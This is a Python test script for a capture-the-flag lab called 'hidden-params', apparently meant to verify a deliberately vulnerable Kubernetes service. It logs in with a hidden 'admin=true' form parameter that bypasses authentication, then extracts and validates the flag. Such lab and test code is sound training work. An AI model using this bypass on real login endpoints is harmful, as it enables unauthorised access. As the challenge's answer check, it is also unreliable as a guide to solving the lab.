#!/usr/bin/env python3
"""
Test module for hidden-params challenge
"""

import requests
from typing import Optional
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils import TestResult, check_service_health, extract_flag_from_response, validate_flag_format, wait_for_service, check_namespace_exists, check_service_exists


def test_hidden_params_challenge(base_url: Optional[str] = None, verbose: bool = False) -> TestResult:
    """Test the hidden-params challenge vulnerability"""
    result = TestResult("Hidden Params Challenge")
    
    # Determine URL
    if not base_url:
        if verbose:
            print("  Checking if namespace exists...")
        if not check_namespace_exists('hidden-params'):
            result.failure("Namespace 'hidden-params' does not exist. Deploy the challenge first using: kubectl apply -f challenges/beginner/hidden-params/")
            return result
        
        if verbose:
            print("  Checking if service exists...")
        if not check_service_exists('hidden-params', 'hidden-params'):
            result.failure("Service 'hidden-params' does not exist in namespace 'hidden-params'. Deploy the challenge first.")
            return result
        
        if verbose:
            print("  Waiting for service NodePort...")
        port = wait_for_service('hidden-params', 'hidden-params')
        if not port:
            result.failure("Could not get service NodePort. The service may not be ready yet. Try: kubectl get svc -n hidden-params")
            result.details['namespace_exists'] = check_namespace_exists('hidden-params')
            result.details['service_exists'] = check_service_exists('hidden-params', 'hidden-params')
            return result
        base_url = f"http://localhost:{port}"
    
    # Check service health with retries (pods might still be starting)
    if verbose:
        print("  Checking service health...")
    is_healthy, health_error = check_service_health(base_url, timeout=10, retries=5, retry_delay=3)
    if not is_healthy:
        error_msg = f"Service not healthy at {base_url} after multiple attempts."
        if health_error:
            error_msg += f" Error: {health_error}"
        result.failure(error_msg)
        result.details['base_url'] = base_url
        result.details['health_error'] = health_error
        result.details['suggestion'] = "Try checking pod status: kubectl get pods -n hidden-params && kubectl logs -n hidden-params -l app=hidden-params"
        return result
    
    try:
        # Test hidden parameter vulnerability
        # The login endpoint accepts a hidden "admin=true" parameter
        login_data = {
            'username': 'test',
            'password': 'test',
            'admin': 'true'  # Hidden parameter that bypasses auth
        }
        
        response = requests.post(
            f"{base_url}/api/login",
            data=login_data,
            timeout=10
        )
        
        if response.status_code != 200:
            result.failure(f"Hidden parameter bypass failed with status {response.status_code}")
            result.details['status_code'] = response.status_code
            result.details['response'] = response.text[:500]
            return result
        
        # Extract flag from response
        flag = extract_flag_from_response(response)
        
        if not flag:
            # Try parsing JSON directly
            try:
                data = response.json()
                if 'flag' in data:
                    flag = data['flag']
            except Exception:
                pass
        
        if not flag:
            result.failure("Flag not found in response")
            result.details['response'] = response.text[:500]
            return result
        
        # Validate flag format
        if not validate_flag_format(flag):
            result.failure(f"Invalid flag format: {flag}")
            return result
        
        result.success(f"Successfully bypassed authentication using hidden parameter", flag)
        result.details['exploited_param'] = 'admin=true'
        result.details['response_data'] = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text[:500]
        return result
        
    except Exception as e:
        result.failure(f"Error during test: {str(e)}")
        import traceback
        result.details['traceback'] = traceback.format_exc()
        return result


if __name__ == '__main__':
    # Allow direct execution for testing
    result = test_hidden_params_challenge()
    print(result)

